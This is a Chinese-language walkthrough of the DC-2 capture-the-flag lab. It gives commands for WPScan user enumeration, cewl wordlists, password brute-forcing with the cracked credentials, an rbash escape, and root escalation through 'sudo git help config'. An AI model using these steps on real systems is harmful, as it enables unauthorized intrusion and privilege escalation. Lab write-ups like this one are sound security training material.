# 信息收集

### 1.主机发现

![1667617889_6365d46157dce764de9dd.png!small?1667617889452](https://image.3001.net/images/20221105/1667617889_6365d46157dce764de9dd.png!small?1667617889452)

### 2.端口扫描 80 7744

###
![1667617898_6365d46a1e0d9f6211a04.png!small?1667617898099](https://image.3001.net/images/20221105/1667617898_6365d46a1e0d9f6211a04.png!small?1667617898099)

### 3.访问192.168.1.109

![1667617912_6365d478a8f4e98e9a0d7.png!small?1667617912997](https://image.3001.net/images/20221105/1667617912_6365d478a8f4e98e9a0d7.png!small?1667617912997)

发现flag1: 提示cewl 生成字典

![1667617923_6365d4835cc29c69a8183.png!small?1667617923363](https://image.3001.net/images/20221105/1667617923_6365d4835cc29c69a8183.png!small?1667617923363)

### 4.CMS

cmseek爆出18个版本漏洞。

![1667617940_6365d494acbd83bf8606d.png!small?1667617940712](https://image.3001.net/images/20221105/1667617940_6365d494acbd83bf8606d.png!small?1667617940712)

![1667617950_6365d49e988a71541b94b.png!small?1667617950720](https://image.3001.net/images/20221105/1667617950_6365d49e988a71541b94b.png!small?1667617950720)

![1667617960_6365d4a843018b161631f.png!small?1667617960357](https://image.3001.net/images/20221105/1667617960_6365d4a843018b161631f.png!small?1667617960357)

### 5.目录扫描

    
    
    dirsearch -u http://192.168.1.109 -i 200 301  
    ​  
    http://dc-2/wp-login.php   后台登录页面

![1667617971_6365d4b3c01302b29c748.png!small?1667617972195](https://image.3001.net/images/20221105/1667617971_6365d4b3c01302b29c748.png!small?1667617972195)

# 渗透

### 1.wpscan获取用户名

    
    
    wpscan --url http://dc-2 --enumerate u  
    admin  
    jerry  
    tom

![1667617983_6365d4bfe9607b90beb94.png!small?1667617984009](https://image.3001.net/images/20221105/1667617983_6365d4bfe9607b90beb94.png!small?1667617984009)

### 2.cewl生成字典

    
    
    cewl http://dc-2 -w password.txt

password.txt

![1667617995_6365d4cb23bd3e4292c66.png!small?1667617995152](https://image.3001.net/images/20221105/1667617995_6365d4cb23bd3e4292c66.png!small?1667617995152)

username.txt

![1667618004_6365d4d401398f9196ebc.png!small?1667618003814](https://image.3001.net/images/20221105/1667618004_6365d4d401398f9196ebc.png!small?1667618003814)

### 3.wpscan爆破获取用户的密码

    
    
    wpscan --url http://dc-2 -U username.txt -P password.txt   
    ​  
    jerry / adipiscing    
    tom / parturient    

![1667618014_6365d4deea67087bc182c.png!small?1667618014981](https://image.3001.net/images/20221105/1667618014_6365d4deea67087bc182c.png!small?1667618014981)

### 4.登录用户

jerry / adipiscing

发现flag2：

![1667618029_6365d4edf1b7951e135f8.png!small?1667618030014](https://image.3001.net/images/20221105/1667618029_6365d4edf1b7951e135f8.png!small?1667618030014)

tom / parturient 没发现啥有用信息

![1667618040_6365d4f853fb3a9d264a7.png!small?1667618040176](https://image.3001.net/images/20221105/1667618040_6365d4f853fb3a9d264a7.png!small?1667618040176)

  

### 5.尝试ssh 7744 端口登录

jerry / adipiscing 登录失败

![1667618053_6365d505516b1ba53cc19.png!small?1667618053491](https://image.3001.net/images/20221105/1667618053_6365d505516b1ba53cc19.png!small?1667618053491)

tom / parturient 登录成功

![1667618061_6365d50dc8ce9541eb8a5.png!small?1667618061778](https://image.3001.net/images/20221105/1667618061_6365d50dc8ce9541eb8a5.png!small?1667618061778)

查看flag3.txt发现cat 有rbash限制。

![1667618087_6365d5276d5d6e7bb75fe.png!small?1667618093166](https://image.3001.net/images/20221105/1667618087_6365d5276d5d6e7bb75fe.png!small?1667618093166)

经尝试vi可以绕过rbash查看flag3.txt,提到了两个用户。tom、jerry

![1667618077_6365d51d4aef8e73b60b3.png!small?1667618077273](https://image.3001.net/images/20221105/1667618077_6365d51d4aef8e73b60b3.png!small?1667618077273)

### 6.绕过rbash

    
    
    BASH_CMDS[a]=/bin/sh;a   
    export PATH=$PATH:/bin/     
    export PATH=$PATH:/usr/bin 

### 7.切换用用户jerry

![1667618099_6365d5331271280b53eed.png!small?1667618098922](https://image.3001.net/images/20221105/1667618099_6365d5331271280b53eed.png!small?1667618098922)

在/home/jerry 目录下发现flag4.txt,提示要得到下个flag需要-git 提权

![1667618112_6365d5407656161e88cfa.png!small?1667618112419](https://image.3001.net/images/20221105/1667618112_6365d5407656161e88cfa.png!small?1667618112419)

# 提权

### 1.git提权

    
    
    sudo git help config  
    在打开的页面底部输入 ！'sh' 在按回车

![1667618122_6365d54ac548fb6120991.png!small?1667618122685](https://image.3001.net/images/20221105/1667618122_6365d54ac548fb6120991.png!small?1667618122685)

### 2.在/root目录下获取flag

![1667618130_6365d552cb110609023ec.png!small?1667618130905](https://image.3001.net/images/20221105/1667618130_6365d552cb110609023ec.png!small?1667618130905)

# 总结

  * 信息收集时端口扫描尽量加上全端口扫描

  * cmseek、wpscan工具的使用

